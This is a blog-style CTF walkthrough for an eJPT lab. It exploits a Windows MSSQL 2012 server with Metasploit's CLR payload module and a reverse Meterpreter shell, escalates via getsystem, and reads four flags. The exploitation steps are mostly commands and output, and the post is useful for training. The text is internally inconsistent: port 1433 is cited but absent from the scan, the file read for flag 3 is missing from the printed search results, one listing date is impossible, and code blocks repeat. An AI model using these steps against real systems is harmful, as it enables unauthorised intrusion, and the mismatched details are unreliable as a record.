---
layout: post
title: "Host & Network Penetration Testing: The Metasploit Framework CTF 1 - Complete Walkthrough"
date: 2025-07-09
categories: [Write-Ups,eJPT]
tags: [ejpt, ine, metasploit, mssql, windows, privilege-escalation,cybersecurity, penetration-testing, metasploit, ctf]
author: "Enhanced Walkthrough"
description: "A comprehensive guide to solving the Metasploit Framework CTF 1 challenge with detailed explanations, hints, and practical examples for EJPT preparation."
---

## Introduction

Welcome to an enhanced walkthrough of the Metasploit Framework CTF 1 challenge! This is part of the eLearnSecurity Junior Penetration Tester (EJPT) certification path from INE.

In this challenge, we'll be working with a single Windows target running MSSQL Server and solving four flags total. This walkthrough includes helpful hints and encourages you to try things yourself before checking the solutions.

**Learning Objectives:**
- Master Windows enumeration techniques
- Understand MSSQL Server exploitation
- Practice privilege escalation in Windows environments
- Learn Windows file system navigation
- Explore Windows configuration directories

---

## Challenge Overview

- **Target:** `target.ine.local` (Windows Server with MSSQL)
- **Total Flags:** 4
- **Tools Required:** Metasploit, Nmap
- **Focus:** Windows exploitation and privilege escalation

---

## Flag 1: MSSQL Server Exploitation

### Challenge Description
*"Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag."*

### 🧠 Think First!
Before jumping to the solution, try these steps yourself:
1. What's the first thing you should do when approaching a new target?
2. How would you identify database services running on a Windows machine?
3. What information do you need to find exploits for specific software versions?

**Try it yourself first! If you get stuck, continue reading below.**

---

### Solution Walkthrough

#### Step 1: Initial Reconnaissance
Start with a comprehensive Nmap scan to identify open ports and services. We're looking for any database services that might be running:

```bash
# Perform a detailed service scan with fast scanning
nmap -sC -sV target.ine.local --min-rate 1000
```

**Scan Results:**
```
root@INE:~|→
nmap -sC -sV target.ine.local --min-rate 1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 18:41 IST
Nmap scan report for target.ine.local (10.5.23.147)
Host is up (0.00014s latency).
Not shown: 991 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
443/tcp open  https         Microsoft IIS httpd
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-19T13:08:19
|_Not valid after:  2055-01-19T13:08:19
|_ssl-date: 2025-01-19T13:08:19+00:00; 0s from scanner time.
| ms-sql-info:
|   10.5.23.147\MSSQLSERVER:
|     Target_Name: WIN-SBQ22QMHK50
|     NetBIOS_Domain_Name: WIN-SBQ22QMHK50
|     NetBIOS_Computer_Name: WIN-SBQ22QMHK50
|     DNS_Domain_Name: WIN-SBQ22QMHK50
|     DNS_Computer_Name: WIN-SBQ22QMHK50
|     Product_Version: 6.3.9600
| ms-sql-info:
|   10.5.23.147\MSSQLSERVER:
|     Instance_name: MSSQLSERVER
|     Version:
|       name: Microsoft Sql Server 2012 SP3
```

🎯 **Great!** The Nmap scan reveals several interesting services, but the real treasure is **Microsoft SQL Server 2012 SP3** running on the default port 1433. This is our ticket in!

#### Step 2: MSSQL Service Investigation
Perfect! We've identified **Microsoft SQL Server 2012 SP3** running. SQL Server 2012 is known to have several vulnerabilities, and with SP3 specifically, we should be able to find some good exploits in Metasploit's arsenal.

#### Step 3: Metasploit Exploit Hunt
Time to fire up Metasploit and hunt for some MSSQL exploits! This is where the real fun begins:

```bash
# Launch Metasploit
msfconsole

# Search for MSSQL 2012 exploits
search MSSQL 2012
```

**Results:**
```
msf6 > search MSSQL 2012

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/windows/mssql/mssql_clr_payload              1999-01-01       excellent  Yes    Microsoft SQL Server CLR Stored Procedure Payload Execution
   1  exploit/windows/mssql/mssql_payload                  2000-01-01       excellent  No     Microsoft SQL Server Database Command Execution
   2  post/windows/manage/mssql_local_auth_bypass                           normal     No     Windows Manage Local Microsoft SQL Server Authorization Bypass


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/mssql/mssql_clr_payload
```

🔍 **Excellent!** We found three MSSQL-related modules. The first one looks particularly promising - `mssql_clr_payload` with an "excellent" rank! CLR (Common Language Runtime) exploits are often very reliable on SQL Server.

#### Step 4: Understanding Our Exploit
Let's examine this CLR exploit more closely before using it:

```bash
# Select the exploit (usually index 0)
use 0

# Get information about the exploit
info
```

**Module Information:**
```
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Description:
  This module executes an arbitrary native payload on a Microsoft SQL 
  server by loading a custom SQL CLR Assembly into the target SQL 
  installation, and creating a new procedure which calls directly to the 
  custom CLR procedure and calling it directly with a base64-encoded payload.
  
  The module requires working credentials in order to connect directly to the 
  MSSQL Server.
  
  This method requires the user to have sufficient privileges to install a custom 
  SQL CLR DLL, and invoke the custom stored procedure that comes with it.
  
  This exploit does not leave any binaries on disk.
  
  Tested on MS SQL Server versions: 2005, 2012, 2016 (all x64).
```

💡 **Perfect!** This exploit is tested specifically on SQL Server 2012, and it uses CLR assemblies to execute code. The beauty of this approach is that it doesn't leave files on disk, making it stealthier.

```bash
# Set the target
set RHOSTS target.ine.local

# Run the exploit
run
```

**Initial Exploit Output:**
```
msf6 exploit(windows/mssql/mssql_clr_payload) > set RHOSTS target.ine.local
RHOSTS => target.ine.local
msf6 exploit(windows/mssql/mssql_clr_payload) > exploit

[*] Started reverse TCP handler on 10.10.47.2:4444
[-] 10.5.23.147:1433 - Getting EXITFUNC to 'thread' so we don't kill SQL Server
[-] 10.5.23.147:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
[-] 10.5.23.147:1433 - Database does not have CLR support enabled, enabling ...
[-] 10.5.23.147:1433 - Using version specific SQL CLR payload Assembly
[-] 10.5.23.147:1433 - Adding custom SQL CLR payload as new Assembly...
[-] 10.5.23.147:1433 - Executing the payload ...
[-] Exploit completed, but no session was created.
```

😤 **Hmm, that didn't work!** The exploit ran but no session was created. This often happens when there's an architecture mismatch - the default payload might be 32-bit, but we're dealing with a 64-bit system.

#### Step 5: The Architecture Fix
Let's try switching to a 64-bit payload since the exploit description mentions it's tested on x64 systems:

```bash
# Set 64-bit payload for Windows
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run the exploit again
exploit
```

**Command Results:**
```
msf6 exploit(windows/mssql/mssql_clr_payload) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > exploit

[*] Started reverse TCP handler on 10.10.47.2:4444
[-] 10.5.23.147:1433 - Getting EXITFUNC to 'thread' so we don't kill SQL Server
[-] 10.5.23.147:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
[-] 10.5.23.147:1433 - Database does not have CLR support enabled, enabling ...
[-] 10.5.23.147:1433 - Using version specific SQL CLR payload Assembly
[-] 10.5.23.147:1433 - Adding custom SQL CLR payload as new Assembly...
[-] 10.5.23.147:1433 - Executing the payload ...
[-] 10.5.23.147:1433 - Removing stored procedure ...
Sending stage (201798 bytes) to 10.5.23.147
[*] 10.5.23.147:1433 - Restoring CLR setting ...
[*] 10.5.23.147:1433 - Restoring Trustworthy setting ...
[*] Meterpreter session 1 opened (10.10.47.2:4444 -> 10.5.23.147:49322) at 2025-01-19 18:54:31 +0530

meterpreter >
```

🎉 **Success!** That did the trick! Notice how the exploit automatically enabled the necessary SQL Server settings (TRUSTWORTHY and CLR support) and then cleaned up after itself. We now have a Meterpreter session!

#### Step 6: System Access and Flag Hunting
Now let's drop into a system shell and start exploring:

```bash
# Drop to system shell
shell
```

**Shell Access:**
```
meterpreter > shell
Process 2588 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
```

Great! We're now on a Windows Server 2012 R2 system. Let's see what's in the root directory:

```bash
# Navigate to C drive
cd C:\

# List directory contents
dir
```

**File Listing:**
```
C:\Windows\system32>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\

01/19/2025  01:09 PM                34 flag1.txt
08/22/2013  09:05 PM    <DIR>          PerfLogs
01/09/2025  07:00 AM    <DIR>          Program Files
12/15/2024  09:27 AM    <DIR>          Program Files (x86)
01/09/2025  07:12 AM    <DIR>          Users
01/09/2025  07:08 AM    <DIR>          Windows
               1 File(s)             34 bytes
               5 Dir(s)  3,484,397,568 bytes free
```

🎯 **Bingo!** There's `flag1.txt` sitting right in the root directory! CTF organizers love putting flags in obvious places sometimes.

```bash
# Read the flag file
type flag1.txt
```

**Flag Content:**
```
C:\>type flag1.txt
type flag1.txt
edb42cc5b37e4a1cac0cf88022f3c70d
```

🎉 **Flag 1 Found:** `edb42cc5b37e4a1cac0cf88022f3c70d`

### 💡 Key Learning Points
- MSSQL Server often has known vulnerabilities that can be exploited
- Architecture compatibility is crucial when selecting payloads
- Always check software versions for specific exploit targeting

---

## Flag 2: Windows Configuration Directory

### Challenge Description
*"Locate the second flag within the Windows configuration folder."*

### 🧠 Think First!
Before checking the solution:
1. Where are Windows configuration files typically stored?
2. What directory structure should you explore in System32?
3. What might prevent access to certain directories, and how would you overcome it?

**Try exploring the Windows file system yourself first!**

---

### Solution Walkthrough

#### Step 1: Navigate to System32
The Windows configuration folder is typically located in System32:

```bash
# Navigate to Windows System32 directory
cd Windows\System32

# List only directories to find config folder
dir /a:d
```

```bash
# Navigate to Windows System32 directory
cd Windows\System32

# List only directories to find config folder
dir /a:d
```

**Directory Listing:**
```
C:\>cd Windows\System32
cd Windows\System32

C:\Windows\System32>dir /a:d
dir /a:d
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\Windows\System32

01/19/2025  01:12 PM    <DIR>          .
01/19/2025  01:12 PM    <DIR>          ..
03/18/2014  09:25 AM    <DIR>          0409
12/15/2025  09:20 AM    <DIR>          1033
08/22/2013  03:39 PM    <DIR>          AdvancedInstallers
08/22/2013  03:39 PM    <DIR>          AppLocker
09/09/2020  04:42 AM    <DIR>          Appraiser
03/18/2014  10:23 AM    <DIR>          ar-SA
02/23/2018  08:00 AM    <DIR>          AxInstPowerShellScript
08/22/2013  03:39 PM    <DIR>          BestPractices
03/18/2014  10:23 AM    <DIR>          bg-BG
04/14/2021  04:03 AM    <DIR>          Boot
12/15/2021  03:42 AM    <DIR>          catroot
12/15/2021  04:15 AM    <DIR>          catroot2
07/14/2021  04:08 AM    <DIR>          CodeIntegrity
01/18/2014  11:26 PM    <DIR>          Com
09/09/2020  04:42 AM    <DIR>          CompatTel
01/09/2025  07:07 AM    <DIR>          config
01/04/2022  03:37 AM    <DIR>          Configuration
08/18/2014  10:23 AM    <DIR>          cs-CZ
03/18/2014  10:23 AM    <DIR>          da-DK
```

```bash
# Try to access config directory
cd config
```

**Access Denied:**
```
C:\Windows\System32>cd config
cd config
Access is denied.
```

#### Step 3: Privilege Escalation
Return to Meterpreter session and escalate privileges:

```bash
# Return to Meterpreter (Ctrl + C)
# Check current privileges
getprivs
```

```bash
# Return to Meterpreter (Ctrl + C)
# Check current privileges
getprivs
```

**Privilege Output:**
```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

```bash
# Escalate to SYSTEM privileges
getsystem
```

**Privilege Escalation:**
```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

```bash
# Drop back to shell
shell
```

#### Step 4: Access Config Directory with Elevated Privileges

```bash
# Navigate to config directory with elevated privileges
cd Windows\System32\config

# List contents
dir
```

```bash
# Navigate to config directory with elevated privileges
cd Windows\System32\config

# List contents
dir
```

**Config Directory Contents:**
```
meterpreter > shell
Process 2544 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd config
cd config

C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\Windows\System32\config

01/19/2025  01:10 PM    <DIR>          .
01/19/2025  01:10 PM    <DIR>          ..
05/09/2014  09:25 AM           262,144 BCD-Template
01/19/2025  01:10 PM       101,187,584 COMPONENTS
08/22/2013  01:25 PM                 0 COMPONENTS.LOG
01/09/2025  07:13 AM         2,621,440 DEFAULT
08/22/2013  01:25 PM                 0 DEFAULT.LOG
01/19/2025  01:25 PM         4,521,984 DRIVERS
01/19/2025  01:09 PM                34 flag2.txt
08/22/2013  01:25 PM               164 FP
08/22/2013  01:25 PM    <DIR>          Journal
01/09/2025  06:58 AM    <DIR>          RegBack
01/19/2025  01:25 PM           262,144 SAM
01/09/2025  07:13 AM           262,144 SECURITY
08/22/2013  01:25 PM                 0 SECURITY.LOG
01/09/2025  07:13 AM        89,653,248 SOFTWARE
08/22/2013  01:25 PM                 0 SOFTWARE.LOG
01/09/2025  07:13 AM        12,582,912 SYSTEM
08/22/2013  01:25 PM                 0 SYSTEM.LOG
06/20/2014  07:56 PM    <DIR>          systemprofile
03/18/2014  10:32 PM    <DIR>          TxR
              15 File(s)    211,353,798 bytes
               6 Dir(s)   3,484,336,128 bytes free
```

```bash
# Read the second flag
type flag2.txt
```

**Flag Content:**
```
C:\Windows\System32\config>type flag2.txt
type flag2.txt
95c12d0654eb4eac91db88262d644ac1
```

🎉 **Flag 2 Found:** `95c12d0654eb4eac91db88262d644ac1`

### 💡 Key Learning Points
- Windows configuration files require elevated privileges to access
- `getsystem` can escalate privileges when SeImpersonatePrivilege is available
- System32\config contains critical Windows configuration data

---

## Flag 3: Hidden System Directory Flag

### Challenge Description
*"The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag."*

### 🧠 Think First!
This flag is "hidden" somewhere in the system directory:
1. How would you search for files across multiple subdirectories?
2. What file patterns might you look for?
3. What search commands are available in Windows?

**Try to search the system directory systematically!**

---

### Solution Walkthrough

#### Step 1: Comprehensive Text File Search
Since we know flags are in .txt files, let's search the entire System32 directory:

```bash
# Search for all .txt files in System32 and subdirectories
dir C:\Windows\System32\*.txt /s /b
```

```bash
# Search for all .txt files in System32 and subdirectories
dir C:\Windows\System32\*.txt /s /b
```

**Search Results:**
```
C:\Windows\System32\config>dir C:\Windows\System32\*.txt /s /b
dir C:\Windows\System32\*.txt /s /b
C:\Windows\System32\config\flag2.txt
C:\Windows\System32\catroot\ubr1.txt
C:\Windows\System32\config\systemprofile\AppData\Local\Amazon\EC2\Logs\FrameworkLaunchException.txt
C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\WindowsUpdate\VirtSetoGuestThisFlag.txt
C:\Windows\System32\en-US\erofflps.txt
C:\Windows\System32\WindowsPowerShell\v1.0\en-US\default-help.txt
C:\Windows\System32\WindowsPowerShell\v1.0\Modules\BitsTransfer\en-US\about_BITS_Cmdlets.help.txt
```

#### Step 2: Investigate Suspicious Files
Look for files with interesting names that might contain flags:

```bash
# Read the suspicious file
type C:\Windows\System32\drivers\etc\EscalatePrivilageToGetThisFlag.txt
```

**File Contents:**
```
C:\Windows\System32\config>type C:\Windows\System32\drivers\etc\EscalatePrivilageToGetThisFlag.txt
type C:\Windows\System32\drivers\etc\EscalatePrivilageToGetThisFlag.txt
9a1dad2c57f441ac83d6755856f364c6
```

🎉 **Flag 3 Found:** `9a1dad2c57f441ac83d6755856f364c6`

### 💡 Key Learning Points
- Windows recursive search using `/s` flag is powerful for finding hidden files
- File names often contain hints about their purpose or location
- The `drivers\etc` directory contains important system configuration files

---

## Flag 4: Administrator Directory Investigation

### Challenge Description
*"Investigate the Administrator directory to find the fourth flag."*

### 🧠 Think First!
Now that we have elevated privileges:
1. Where would the Administrator's personal files be stored?
2. What directories should you check within a user profile?
3. How do you navigate to user directories in Windows?

**Try exploring the Administrator profile yourself!**

---

### Solution Walkthrough

#### Step 1: Navigate to Administrator Directory
With our elevated privileges, we can access the Administrator's profile:

```bash
# Navigate to Administrator directory
cd C:\Users\Administrator

# List contents
dir
```

```bash
# Navigate to Administrator directory
cd C:\Users\Administrator

# List contents
dir
```

**Administrator Directory:**
```
C:\Windows\System32\config>cd C:\Users\Administrator
cd C:\Users\Administrator
```

#### Step 2: Check Desktop for Flag
The Desktop is often where administrators store important files (and flags!):

```bash
# Navigate to Desktop
cd Desktop

# List contents
dir
```

**Desktop Contents:**
```
C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\Users\Administrator\Desktop

01/19/2025  01:09 PM    <DIR>          .
01/19/2025  01:09 PM    <DIR>          ..
01/19/2025  01:09 PM                34 flag4.txt
               1 File(s)             34 bytes
               2 Dir(s)  3,484,336,128 bytes free
```

Excellent! There's our final flag sitting right on the Administrator's desktop. 

```bash
# Read the final flag
type flag4.txt
```

**Final Flag Content:**
```
C:\Users\Administrator\Desktop>type flag4.txt
type flag4.txt
f7337e642619460c8b1fee34114e578a
```

🎉 **Flag 4 Found:** `f7337e642619460c8b1fee34114e578a`

### 💡 Key Learning Points
- Administrator profiles contain sensitive files and flags
- Desktop directories are common locations for important files
- Privilege escalation opens access to previously restricted areas
- User profiles follow a predictable structure in Windows

---

## Summary and Key Takeaways

### Flags Collected
1. **Flag 1:** `edb42cc5b37e4a1cac0cf88022f3c70d` (MSSQL Server exploitation)
2. **Flag 2:** `95c12d0654eb4eac91db88262d644ac1` (Windows configuration directory)
3. **Flag 3:** `9a1dad2c57f441ac83d6755856f364c6` (Hidden system directory search)
4. **Flag 4:** `f7337e642619460c8b1fee34114e578a` (Administrator directory investigation)

### What We Learned
This CTF challenged us to think like real penetration testers by:
- **Identifying vulnerable services** through proper reconnaissance
- **Exploiting database vulnerabilities** using CLR injection techniques
- **Escalating privileges** through Windows token impersonation
- **Navigating complex file systems** to find hidden data
- **Understanding Windows security models** and privilege boundaries

The progression from basic exploitation to privilege escalation to comprehensive system exploration mirrors real-world penetration testing scenarios where persistence and thorough investigation are key to success.

---

*Happy hacking and good luck with your EJPT certification journey! Remember: practice, document everything, and always think like an attacker while maintaining ethical standards.*